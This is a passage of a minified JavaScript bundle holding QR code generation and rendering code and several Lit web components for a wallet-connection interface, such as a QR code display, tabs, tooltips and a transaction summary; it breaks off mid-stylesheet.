r=zc.getSymbolTotalCodewords(e),o=bu.getTotalCodewordsCount(e,n),i=r-o,a=bu.getBlocksCount(e,n),s=r%a,c=a-s,l=Math.floor(r/a),u=Math.floor(i/a),p=u+1,m=l-u,g=new qv(m);let w=0;const v=new Array(a),E=new Array(a);let I=0;const b=new Uint8Array(t.buffer);for(let f=0;f<a;f++){const T=f<c?u:p;v[f]=b.slice(w,w+T),E[f]=g.encode(v[f]),w+=T,I=Math.max(I,T)}const _=new Uint8Array(r);let x=0,C,A;for(C=0;C<I;C++)for(A=0;A<a;A++)C<v[A].length&&(_[x++]=v[A][C]);for(C=0;C<m;C++)for(A=0;A<a;A++)_[x++]=E[A][C];return _}function i5(t,e,n,r){let o;if(Array.isArray(t))o=$l.fromArray(t);else if(typeof t=="string"){let l=e;if(!l){const u=$l.rawSplit(t);l=Ls.getBestVersionForData(u,n)}o=$l.fromString(t,l||40)}else throw new Error("Invalid data");const i=Ls.getBestVersionForData(o,n);if(!i)throw new Error("The amount of data is too big to be stored in a QR Code");if(!e)e=i;else if(e<i)throw new Error(`
The chosen QR Code version cannot contain this amount of data.
Minimum version required to store current data is: `+i+`.
`);const a=n5(e,n,o),s=zc.getSymbolSize(e),c=new Vv(s);return Jv(c,e),Xv(c),Qv(c,e),Ol(c,n,0),e>=7&&e5(c,e),t5(c,a),isNaN(r)&&(r=wu.getBestMask(c,Ol.bind(null,c,n))),wu.applyMask(r,c),Ol(c,n,r),{modules:c,version:e,errorCorrectionLevel:n,maskPattern:r,segments:o}}Fp.create=function(e,n){if(typeof e>"u"||e==="")throw new Error("No input text");let r=Il.M,o,i;return typeof n<"u"&&(r=Il.from(n.errorCorrectionLevel,Il.M),o=Ls.from(n.version),i=wu.from(n.maskPattern),n.toSJISFunc&&zc.setToSJISFunction(n.toSJISFunc)),i5(e,o,r,i)};var e1={},Vd={};(function(t){function e(n){if(typeof n=="number"&&(n=n.toString()),typeof n!="string")throw new Error("Color should be defined as hex string");let r=n.slice().replace("#","").split("");if(r.length<3||r.length===5||r.length>8)throw new Error("Invalid hex color: "+n);(r.length===3||r.length===4)&&(r=Array.prototype.concat.apply([],r.map(function(i){return[i,i]}))),r.length===6&&r.push("F","F");const o=parseInt(r.join(""),16);return{r:o>>24&255,g:o>>16&255,b:o>>8&255,a:o&255,hex:"#"+r.slice(0,6).join("")}}t.getOptions=function(r){r||(r={}),r.color||(r.color={});const o=typeof r.margin>"u"||r.margin===null||r.margin<0?4:r.margin,i=r.width&&r.width>=21?r.width:void 0,a=r.scale||4;return{width:i,scale:i?4:a,margin:o,color:{dark:e(r.color.dark||"#000000ff"),light:e(r.color.light||"#ffffffff")},type:r.type,rendererOpts:r.rendererOpts||{}}},t.getScale=function(r,o){return o.width&&o.width>=r+o.margin*2?o.width/(r+o.margin*2):o.scale},t.getImageWidth=function(r,o){const i=t.getScale(r,o);return Math.floor((r+o.margin*2)*i)},t.qrToImageData=function(r,o,i){const a=o.modules.size,s=o.modules.data,c=t.getScale(a,i),l=Math.floor((a+i.margin*2)*c),u=i.margin*c,p=[i.color.light,i.color.dark];for(let m=0;m<l;m++)for(let g=0;g<l;g++){let w=(m*l+g)*4,v=i.color.light;if(m>=u&&g>=u&&m<l-u&&g<l-u){const E=Math.floor((m-u)/c),I=Math.floor((g-u)/c);v=p[s[E*a+I]?1:0]}r[w++]=v.r,r[w++]=v.g,r[w++]=v.b,r[w]=v.a}}})(Vd);(function(t){const e=Vd;function n(o,i,a){o.clearRect(0,0,i.width,i.height),i.style||(i.style={}),i.height=a,i.width=a,i.style.height=a+"px",i.style.width=a+"px"}function r(){try{return document.createElement("canvas")}catch{throw new Error("You need to specify a canvas element")}}t.render=function(i,a,s){let c=s,l=a;typeof c>"u"&&(!a||!a.getContext)&&(c=a,a=void 0),a||(l=r()),c=e.getOptions(c);const u=e.getImageWidth(i.modules.size,c),p=l.getContext("2d"),m=p.createImageData(u,u);return e.qrToImageData(m.data,i,c),n(p,l,u),p.putImageData(m,0,0),l},t.renderToDataURL=function(i,a,s){let c=s;typeof c>"u"&&(!a||!a.getContext)&&(c=a,a=void 0),c||(c={});const l=t.render(i,a,c),u=c.type||"image/png",p=c.rendererOpts||{};return l.toDataURL(u,p.quality)}})(e1);var t1={};const o5=Vd;function c0(t,e){const n=t.a/255,r=e+'="'+t.hex+'"';return n<1?r+" "+e+'-opacity="'+n.toFixed(2).slice(1)+'"':r}function Pl(t,e,n){let r=t+e;return typeof n<"u"&&(r+=" "+n),r}function a5(t,e,n){let r="",o=0,i=!1,a=0;for(let s=0;s<t.length;s++){const c=Math.floor(s%e),l=Math.floor(s/e);!c&&!i&&(i=!0),t[s]?(a++,s>0&&c>0&&t[s-1]||(r+=i?Pl("M",c+n,.5+l+n):Pl("m",o,0),o=0,i=!1),c+1<e&&t[s+1]||(r+=Pl("h",a),a=0)):o++}return r}t1.render=function(e,n,r){const o=o5.getOptions(n),i=e.modules.size,a=e.modules.data,s=i+o.margin*2,c=o.color.light.a?"<path "+c0(o.color.light,"fill")+' d="M0 0h'+s+"v"+s+'H0z"/>':"",l="<path "+c0(o.color.dark,"stroke")+' d="'+a5(a,i,o.margin)+'"/>',u='viewBox="0 0 '+s+" "+s+'"',m='<svg xmlns="http://www.w3.org/2000/svg" '+(o.width?'width="'+o.width+'" height="'+o.width+'" ':"")+u+' shape-rendering="crispEdges">'+c+l+`</svg>
`;return typeof r=="function"&&r(null,m),m};const s5=vv,yu=Fp,n1=e1,c5=t1;function Zd(t,e,n,r,o){const i=[].slice.call(arguments,1),a=i.length,s=typeof i[a-1]=="function";if(!s&&!s5())throw new Error("Callback required as last argument");if(s){if(a<2)throw new Error("Too few arguments provided");a===2?(o=n,n=e,e=r=void 0):a===3&&(e.getContext&&typeof o>"u"?(o=r,r=void 0):(o=r,r=n,n=e,e=void 0))}else{if(a<1)throw new Error("Too few arguments provided");return a===1?(n=e,e=r=void 0):a===2&&!e.getContext&&(r=n,n=e,e=void 0),new Promise(function(c,l){try{const u=yu.create(n,r);c(t(u,e,r))}catch(u){l(u)}})}try{const c=yu.create(n,r);o(null,t(c,e,r))}catch(c){o(c)}}Ha.create=yu.create;Ha.toCanvas=Zd.bind(null,n1.render);Ha.toDataURL=Zd.bind(null,n1.renderToDataURL);Ha.toString=Zd.bind(null,function(t,e,n){return c5.render(t,n)});const l5=.1,l0=2.5,Mn=7;function Dl(t,e,n){return t===e?!1:(t-e<0?e-t:t-e)<=n+l5}function u5(t,e){const n=Array.prototype.slice.call(Ha.create(t,{errorCorrectionLevel:e}).modules.data,0),r=Math.sqrt(n.length);return n.reduce((o,i,a)=>(a%r===0?o.push([i]):o[o.length-1].push(i))&&o,[])}const d5={generate(t,e,n){const r="#141414",o="transparent",a=[],s=u5(t,"Q"),c=e/s.length,l=[{x:0,y:0},{x:1,y:0},{x:0,y:1}];l.forEach(({x:v,y:E})=>{const I=(s.length-Mn)*c*v,b=(s.length-Mn)*c*E,_=.45;for(let x=0;x<l.length;x+=1){const C=c*(Mn-x*2);a.push(K`
            <rect
              fill=${x===2?r:o}
              width=${x===0?C-5:C}
              rx= ${x===0?(C-5)*_:C*_}
              ry= ${x===0?(C-5)*_:C*_}
              stroke=${r}
              stroke-width=${x===0?5:0}
              height=${x===0?C-5:C}
              x= ${x===0?b+c*x+5/2:b+c*x}
              y= ${x===0?I+c*x+5/2:I+c*x}
            />
          `)}});const u=Math.floor((n+25)/c),p=s.length/2-u/2,m=s.length/2+u/2-1,g=[];s.forEach((v,E)=>{v.forEach((I,b)=>{if(s[E][b]&&!(E<Mn&&b<Mn||E>s.length-(Mn+1)&&b<Mn||E<Mn&&b>s.length-(Mn+1))&&!(E>p&&E<m&&b>p&&b<m)){const _=E*c+c/2,x=b*c+c/2;g.push([_,x])}})});const w={};return g.forEach(([v,E])=>{var I;w[v]?(I=w[v])==null||I.push(E):w[v]=[E]}),Object.entries(w).map(([v,E])=>{const I=E.filter(b=>E.every(_=>!Dl(b,_,c)));return[Number(v),I]}).forEach(([v,E])=>{E.forEach(I=>{a.push(K`<circle cx=${v} cy=${I} fill=${r} r=${c/l0} />`)})}),Object.entries(w).filter(([v,E])=>E.length>1).map(([v,E])=>{const I=E.filter(b=>E.some(_=>Dl(b,_,c)));return[Number(v),I]}).map(([v,E])=>{E.sort((b,_)=>b<_?-1:1);const I=[];for(const b of E){const _=I.find(x=>x.some(C=>Dl(b,C,c)));_?_.push(b):I.push([b])}return[v,I.map(b=>[b[0],b[b.length-1]])]}).forEach(([v,E])=>{E.forEach(([I,b])=>{a.push(K`
              <line
                x1=${v}
                x2=${v}
                y1=${I}
                y2=${b}
                stroke=${r}
                stroke-width=${c/(l0/2)}
                stroke-linecap="round"
              />
            `)})}),a}},f5=q`
  :host {
    position: relative;
    user-select: none;
    display: block;
    overflow: hidden;
    aspect-ratio: 1 / 1;
    width: var(--local-size);
  }

  :host([data-theme='dark']) {
    border-radius: clamp(0px, var(--wui-border-radius-l), 40px);
    background-color: var(--wui-color-inverse-100);
    padding: var(--wui-spacing-l);
  }

  :host([data-theme='light']) {
    box-shadow: 0 0 0 1px var(--wui-color-bg-125);
    background-color: var(--wui-color-bg-125);
  }

  svg:first-child,
  wui-image,
  wui-icon {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translateY(-50%) translateX(-50%);
  }

  wui-image {
    width: 25%;
    height: 25%;
    border-radius: var(--wui-border-radius-xs);
  }

  wui-icon {
    width: 100%;
    height: 100%;
    color: #3396ff !important;
    transform: translateY(-50%) translateX(-50%) scale(0.25);
  }
`;var uo=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let zn=class extends H{constructor(){super(...arguments),this.uri="",this.size=0,this.theme="dark",this.imageSrc=void 0,this.alt=void 0}render(){return this.dataset.theme=this.theme,this.style.cssText=`--local-size: ${this.size}px`,$`${this.templateVisual()} ${this.templateSvg()}`}templateSvg(){const e=this.theme==="light"?this.size:this.size-32;return K`
      <svg height=${e} width=${e}>
        ${d5.generate(this.uri,e,e/4)}
      </svg>
    `}templateVisual(){return this.imageSrc?$`<wui-image src=${this.imageSrc} alt=${this.alt??"logo"}></wui-image>`:$`<wui-icon size="inherit" color="inherit" name="walletConnect"></wui-icon>`}};zn.styles=[pe,f5];uo([O()],zn.prototype,"uri",void 0);uo([O({type:Number})],zn.prototype,"size",void 0);uo([O()],zn.prototype,"theme",void 0);uo([O()],zn.prototype,"imageSrc",void 0);uo([O()],zn.prototype,"alt",void 0);zn=uo([z("wui-qr-code")],zn);const h5=q`
  :host {
    position: relative;
    display: inline-block;
    width: 100%;
  }
`;var p5=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let js=class extends H{constructor(){super(...arguments),this.inputComponentRef=Uc()}render(){return $`
      <wui-input-text
        ${Bc(this.inputComponentRef)}
        placeholder="Search wallet"
        icon="search"
        type="search"
        enterKeyHint="search"
        size="sm"
      >
        <wui-input-element @click=${this.clearValue} icon="close"></wui-input-element>
      </wui-input-text>
    `}clearValue(){const e=this.inputComponentRef.value,n=e==null?void 0:e.inputElementRef.value;n&&(n.value="",n.focus(),n.dispatchEvent(new Event("input")))}};js.styles=[pe,h5];js=p5([z("wui-search-bar")],js);const m5=q`
  :host {
    display: flex;
    column-gap: var(--wui-spacing-xs);
    align-items: center;
    padding: 7px var(--wui-spacing-l) 7px var(--wui-spacing-xs);
    border-radius: var(--wui-border-radius-3xl);
    border: 1px solid var(--wui-gray-glass-005);
    background-color: var(--wui-color-bg-175);
    box-shadow:
      0px 14px 64px -4px rgba(0, 0, 0, 0.15),
      0px 8px 22px -6px rgba(0, 0, 0, 0.15);
  }
`;var Za=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let mr=class extends H{constructor(){super(...arguments),this.backgroundColor="accent-100",this.iconColor="accent-100",this.icon="checkmark",this.message=""}render(){return $`
      <wui-icon-box
        size="xs"
        iconColor=${this.iconColor}
        backgroundColor=${this.backgroundColor}
        icon=${this.icon}
      ></wui-icon-box>
      <wui-text variant="paragraph-500" color="fg-100">${this.message}</wui-text>
    `}};mr.styles=[pe,m5];Za([O()],mr.prototype,"backgroundColor",void 0);Za([O()],mr.prototype,"iconColor",void 0);Za([O()],mr.prototype,"icon",void 0);Za([O()],mr.prototype,"message",void 0);mr=Za([z("wui-snackbar")],mr);const g5=q`
  :host {
    display: inline-flex;
    background-color: var(--wui-gray-glass-002);
    border-radius: var(--wui-border-radius-3xl);
    padding: var(--wui-spacing-3xs);
    position: relative;
    height: 36px;
    overflow: hidden;
  }

  :host::before {
    content: '';
    position: absolute;
    pointer-events: none;
    top: 4px;
    left: 4px;
    display: block;
    width: var(--local-tab-width);
    height: 28px;
    border-radius: var(--wui-border-radius-3xl);
    background-color: var(--wui-gray-glass-002);
    box-shadow: inset 0 0 0 1px var(--wui-gray-glass-002);
    transform: translateX(calc(var(--local-tab) * var(--local-tab-width)));
    transition: transform var(--wui-ease-out-power-2) var(--wui-duration-lg);
  }

  :host([data-type='flex'])::before {
    left: 3px;
    transform: translateX(calc((var(--local-tab) * 34px) + (var(--local-tab) * 4px)));
  }

  :host([data-type='flex']) {
    display: flex;
    padding: 0px 0px 0px 12px;
    gap: 4px;
  }

  :host([data-type='flex']) > button > wui-text {
    position: absolute;
    left: 18px;
    opacity: 0;
  }

  button[data-active='true'] > wui-icon,
  button[data-active='true'] > wui-text {
    color: var(--wui-color-fg-100);
  }

  button[data-active='false'] > wui-icon,
  button[data-active='false'] > wui-text {
    color: var(--wui-color-fg-200);
  }

  button[data-active='true']:disabled,
  button[data-active='false']:disabled {
    background-color: transparent;
    opacity: 0.5;
    cursor: not-allowed;
  }

  button[data-active='true']:disabled > wui-text {
    color: var(--wui-color-fg-200);
  }

  button[data-active='false']:disabled > wui-text {
    color: var(--wui-color-fg-300);
  }

  button > wui-icon,
  button > wui-text {
    pointer-events: none;
    transition: all var(--wui-ease-out-power-2) var(--wui-duration-lg);
  }

  button {
    width: var(--local-tab-width);
  }

  :host([data-type='flex']) > button {
    width: 34px;
    position: relative;
    display: flex;
    justify-content: flex-start;
  }

  button:hover:enabled,
  button:active:enabled {
    background-color: transparent !important;
  }

  button:hover:enabled > wui-icon,
  button:active:enabled > wui-icon {
    color: var(--wui-color-fg-125);
  }

  button:hover:enabled > wui-text,
  button:active:enabled > wui-text {
    color: var(--wui-color-fg-125);
  }

  button {
    border-radius: var(--wui-border-radius-3xl);
  }
`;var Ar=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let un=class extends H{constructor(){super(...arguments),this.tabs=[],this.onTabChange=()=>null,this.buttons=[],this.disabled=!1,this.activeTab=0,this.localTabWidth="100px",this.isDense=!1}render(){return this.isDense=this.tabs.length>3,this.style.cssText=`
      --local-tab: ${this.activeTab};
      --local-tab-width: ${this.localTabWidth};
    `,this.dataset.type=this.isDense?"flex":"block",this.tabs.map((e,n)=>{const r=n===this.activeTab;return $`
        <button
          ?disabled=${this.disabled}
          @click=${()=>this.onTabClick(n)}
          data-active=${r}
        >
          <wui-icon size="xs" color="inherit" name=${e.icon}></wui-icon>
          <wui-text variant="small-600" color="inherit"> ${e.label} </wui-text>
        </button>
      `})}firstUpdated(){this.shadowRoot&&this.isDense&&(this.buttons=[...this.shadowRoot.querySelectorAll("button")],setTimeout(()=>{this.animateTabs(0,!0)},0))}onTabClick(e){this.buttons&&this.animateTabs(e,!1),this.activeTab=e,this.onTabChange(e)}animateTabs(e,n){const r=this.buttons[this.activeTab],o=this.buttons[e],i=r==null?void 0:r.querySelector("wui-text"),a=o==null?void 0:o.querySelector("wui-text"),s=o==null?void 0:o.getBoundingClientRect(),c=a==null?void 0:a.getBoundingClientRect();r&&i&&!n&&e!==this.activeTab&&(i.animate([{opacity:0}],{duration:50,easing:"ease",fill:"forwards"}),r.animate([{width:"34px"}],{duration:500,easing:"ease",fill:"forwards"})),o&&s&&c&&a&&(e!==this.activeTab||n)&&(this.localTabWidth=`${Math.round(s.width+c.width)+6}px`,o.animate([{width:`${s.width+c.width}px`}],{duration:n?0:500,fill:"forwards",easing:"ease"}),a.animate([{opacity:1}],{duration:n?0:125,delay:n?0:200,fill:"forwards",easing:"ease"}))}};un.styles=[pe,Ye,g5];Ar([O({type:Array})],un.prototype,"tabs",void 0);Ar([O()],un.prototype,"onTabChange",void 0);Ar([O({type:Array})],un.prototype,"buttons",void 0);Ar([O({type:Boolean})],un.prototype,"disabled",void 0);Ar([ee()],un.prototype,"activeTab",void 0);Ar([ee()],un.prototype,"localTabWidth",void 0);Ar([ee()],un.prototype,"isDense",void 0);un=Ar([z("wui-tabs")],un);const w5=q`
  :host {
    display: block;
    padding: 9px var(--wui-spacing-s) 10px var(--wui-spacing-s);
    border-radius: var(--wui-border-radius-xxs);
    background-color: var(--wui-color-fg-100);
    color: var(--wui-color-bg-100);
    position: relative;
  }

  wui-icon {
    position: absolute;
    width: 12px !important;
    height: 4px !important;
  }

  wui-icon[data-placement='top'] {
    bottom: 0;
    left: 50%;
    transform: translate(-50%, 95%);
  }

  wui-icon[data-placement='bottom'] {
    top: 0;
    left: 50%;
    transform: translate(-50%, -95%) rotate(180deg);
  }

  wui-icon[data-placement='right'] {
    top: 50%;
    left: 0;
    transform: translate(-65%, -50%) rotate(90deg);
  }

  wui-icon[data-placement='left'] {
    top: 50%;
    right: 0%;
    transform: translate(65%, -50%) rotate(270deg);
  }
`;var Gd=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let Ki=class extends H{constructor(){super(...arguments),this.placement="top",this.message=""}render(){return $`<wui-icon
        data-placement=${this.placement}
        color="fg-100"
        size="inherit"
        name="cursor"
      ></wui-icon>
      <wui-text color="inherit" variant="small-500">${this.message}</wui-text>`}};Ki.styles=[pe,Ye,w5];Gd([O()],Ki.prototype,"placement",void 0);Gd([O()],Ki.prototype,"message",void 0);Ki=Gd([z("wui-tooltip")],Ki);const b5=q`
  :host {
    display: flex;
    justify-content: center;
    align-items: center;
    width: var(--wui-icon-box-size-xl);
    height: var(--wui-icon-box-size-xl);
    box-shadow: 0 0 0 8px var(--wui-thumbnail-border);
    border-radius: var(--local-border-radius);
    overflow: hidden;
  }

  wui-icon {
    width: 32px;
    height: 32px;
  }
`;var Hc=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let ei=class extends H{render(){return this.style.cssText=`--local-border-radius: ${this.borderRadiusFull?"1000px":"20px"};`,$`${this.templateVisual()}`}templateVisual(){return this.imageSrc?$`<wui-image src=${this.imageSrc} alt=${this.alt??""}></wui-image>`:$`<wui-icon
      data-parent-size="md"
      size="inherit"
      color="inherit"
      name="walletPlaceholder"
    ></wui-icon>`}};ei.styles=[pe,b5];Hc([O()],ei.prototype,"imageSrc",void 0);Hc([O()],ei.prototype,"alt",void 0);Hc([O({type:Boolean})],ei.prototype,"borderRadiusFull",void 0);ei=Hc([z("wui-visual-thumbnail")],ei);const y5=q`
  :host {
    display: block;
  }

  button {
    width: 100%;
    display: block;
    padding-top: var(--wui-spacing-l);
    padding-bottom: var(--wui-spacing-l);
    padding-left: var(--wui-spacing-s);
    padding-right: var(--wui-spacing-2l);
    border-radius: var(--wui-border-radius-s);
    background-color: var(--wui-accent-glass-015);
  }

  button:hover {
    background-color: var(--wui-accent-glass-010) !important;
  }

  button:active {
    background-color: var(--wui-accent-glass-020) !important;
  }
`;var Vc=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let ti=class extends H{constructor(){super(...arguments),this.label="",this.description="",this.icon="wallet"}render(){return $`
      <button>
        <wui-flex gap="m" alignItems="center" justifyContent="space-between">
          <wui-icon-box
            size="lg"
            iconcolor="accent-100"
            backgroundcolor="accent-100"
            icon=${this.icon}
            background="transparent"
          ></wui-icon-box>

          <wui-flex flexDirection="column" gap="3xs">
            <wui-text variant="paragraph-500" color="fg-100">${this.label}</wui-text>
            <wui-text variant="small-400" color="fg-200">${this.description}</wui-text>
          </wui-flex>

          <wui-icon size="md" color="fg-200" name="chevronRight"></wui-icon>
        </wui-flex>
      </button>
    `}};ti.styles=[pe,Ye,y5];Vc([O()],ti.prototype,"label",void 0);Vc([O()],ti.prototype,"description",void 0);Vc([O()],ti.prototype,"icon",void 0);ti=Vc([z("wui-notice-card")],ti);const v5=q`
  button {
    height: auto;
    position: relative;
    flex-direction: column;
    gap: var(--wui-spacing-s);
    padding: 17px 18px 17px var(--wui-spacing-m);
    width: 100%;
    background-color: var(--wui-gray-glass-002);
    border-radius: var(--wui-border-radius-xs);
    color: var(--wui-color-fg-250);
  }

  .overflowedContent {
    width: 100%;
    overflow: hidden;
  }

  .overflowedContent[data-active='false']:after {
    content: '';
    position: absolute;
    top: 50%;
    left: 0;
    right: 0;
    bottom: 0;
    background: linear-gradient(to top, var(--wui-color-bg-200), transparent);
    border-bottom-left-radius: var(--wui-border-radius-xs);
    border-bottom-right-radius: var(--wui-border-radius-xs);
  }

  .heightContent {
    max-height: 100px;
  }

  pre {
    text-align: left;
    white-space: pre-wrap;
    height: auto;
    overflow-x: auto;
    overflow-wrap: anywhere;
  }
`;var qd=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};const Rl=100;let Yi=class extends H{constructor(){super(...arguments),this.textTitle="",this.overflowedContent="",this.toggled=!1,this.enableAccordion=!1,this.scrollElement=void 0,this.scrollHeightElement=0}firstUpdated(){setTimeout(()=>{var n;const e=(n=this.shadowRoot)==null?void 0:n.querySelector(".heightContent");if(e){this.scrollElement=e;const r=e==null?void 0:e.scrollHeight;r&&r>Rl&&(this.enableAccordion=!0,this.scrollHeightElement=r,this.requestUpdate())}},0)}render(){return $`
      <button ontouchstart @click=${()=>this.onClick()}>
        <wui-flex justifyContent="space-between" alignItems="center">
          <wui-text variant="paragraph-500" color="fg-100">${this.textTitle}</wui-text>
          ${this.chevronTemplate()}
        </wui-flex>
        <div
          data-active=${this.enableAccordion?!!this.toggled:!0}
          class="overflowedContent"
        >
          <div class="heightContent">
            <wui-text variant="paragraph-400" color="fg-200">
              <pre>${this.overflowedContent}</pre>
            </wui-text>
          </div>
        </div>
      </button>
    `}onClick(){var n;const e=(n=this.shadowRoot)==null?void 0:n.querySelector("wui-icon");this.enableAccordion&&(this.toggled=!this.toggled,this.requestUpdate(),this.scrollElement&&this.scrollElement.animate([{maxHeight:this.toggled?`${Rl}px`:`${this.scrollHeightElement}px`},{maxHeight:this.toggled?`${this.scrollHeightElement}px`:`${Rl}px`}],{duration:300,fill:"forwards",easing:"ease"}),e&&e.animate([{transform:this.toggled?"rotate(0deg)":"rotate(180deg)"},{transform:this.toggled?"rotate(180deg)":"rotate(0deg)"}],{duration:300,fill:"forwards",easing:"ease"}))}chevronTemplate(){return this.enableAccordion?$` <wui-icon color="fg-100" size="sm" name="chevronBottom"></wui-icon>`:null}};Yi.styles=[pe,Ye,v5];qd([O()],Yi.prototype,"textTitle",void 0);qd([O()],Yi.prototype,"overflowedContent",void 0);Yi=qd([z("wui-list-accordion")],Yi);const x5=q`
  :host {
    display: flex;
    column-gap: var(--wui-spacing-s);
    padding: 17px 18px 17px var(--wui-spacing-m);
    width: 100%;
    background-color: var(--wui-gray-glass-002);
    border-radius: var(--wui-border-radius-xs);
    color: var(--wui-color-fg-250);
  }

  wui-image {
    width: var(--wui-icon-size-lg);
    height: var(--wui-icon-size-lg);
    border-radius: var(--wui-border-radius-3xl);
  }

  wui-icon {
    width: var(--wui-icon-size-lg);
    height: var(--wui-icon-size-lg);
  }
`;var Zc=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let ni=class extends H{constructor(){super(...arguments),this.imageSrc=void 0,this.textTitle="",this.textValue=void 0}render(){return $`
      <wui-flex justifyContent="space-between" alignItems="center">
        <wui-text variant="paragraph-500" color=${this.textValue?"fg-200":"fg-100"}>
          ${this.textTitle}
        </wui-text>
        ${this.templateContent()}
      </wui-flex>
    `}templateContent(){return this.imageSrc?$`<wui-image src=${this.imageSrc} alt=${this.textTitle}></wui-image>`:this.textValue?$` <wui-text variant="paragraph-400" color="fg-100"> ${this.textValue} </wui-text>`:$`<wui-icon size="inherit" color="fg-200" name="networkPlaceholder"></wui-icon>`}};ni.styles=[pe,Ye,x5];Zc([O()],ni.prototype,"imageSrc",void 0);Zc([O()],ni.prototype,"textTitle",void 0);Zc([O()],ni.prototype,"textValue",void 0);ni=Zc([z("wui-list-content")],ni);const _5=q`
  :host {
    display: flex;
    flex-direction: column;
    gap: var(--wui-spacing-l);
    padding: 17px 18px 17px var(--wui-spacing-m);
    width: 100%;
    background-color: var(--wui-gray-glass-002);
    border-radius: var(--wui-border-radius-xs);
    color: var(--wui-color-fg-250);
  }

  wui-image {
    width: var(--wui-icon-size-lg);
    height: var(--wui-icon-size-lg);
    border-radius: var(--wui-border-radius-3xl);
  }

  wui-icon {
    width: var(--wui-icon-size-lg);
    height: var(--wui-icon-size-lg);
  }
`;var Ga=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let gr=class extends H{constructor(){super(...arguments),this.amount="",this.networkCurreny="",this.networkImageUrl="",this.receiverAddress=""}render(){return $`
      <wui-flex justifyContent="space-between" alignItems="center">
        <wui-text variant="paragraph-500" color="fg-200">Sending</wui-text>
        <wui-flex gap="xs" alignItems="center">
          <wui-text variant="paragraph-400" color="fg-100">
            ${this.amount} ${this.networkCurreny}
          </wui-text>
          ${this.templateNetworkVisual()}
        </wui-flex>
      </wui-flex>
      <wui-flex justifyContent="space-between" alignItems="center">
        <wui-text variant="paragraph-500" color="fg-200">To</wui-text>
        <wui-chip
          icon="externalLink"
          variant="shadeSmall"
          href=${this.receiverAddress}
          title=${this.receiverAddress}
        ></wui-chip>
      </wui-flex>
    `}templateNetworkVisual(){return this.networkImageUrl?$`<wui-image src=${this.networkImageUrl} alt="Network Image"></wui-image>`:$`<wui-icon size="inherit" color="fg-200" name="networkPlaceholder"></wui-icon>`}};gr.styles=[pe,Ye,_5];Ga([O()],gr.prototype,"amount",void 0);Ga([O()],gr.prototype,"networkCurreny",void 0);Ga([O()],gr.prototype,"networkImageUrl",void 0);Ga([O()],gr.prototype,"receiverAddress",void 0);gr=Ga([z("wui-list-wallet-transaction")],gr);const E5=q`
  :host {
    display: grid;
    width: inherit;
    height: inherit;
  }
